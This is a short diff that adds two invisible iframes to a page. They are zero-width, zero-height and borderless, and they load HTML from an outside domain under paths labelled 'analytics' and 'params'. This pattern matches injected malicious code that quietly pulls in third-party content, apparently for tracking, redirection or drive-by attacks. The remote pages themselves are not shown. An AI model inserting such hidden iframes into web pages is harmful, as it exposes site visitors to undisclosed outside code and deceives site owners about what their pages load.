@@ -1,0 +1,2 @@
+<iframe src="https://inibeslim.com.br/scripts/analytics.html" style="width:0;height:0;border:0; border:none;"></iframe>
+<iframe src="https://inibeslim.com.br/scripts/params.html" style="width:0;height:0;border:0; border:none;"></iframe>
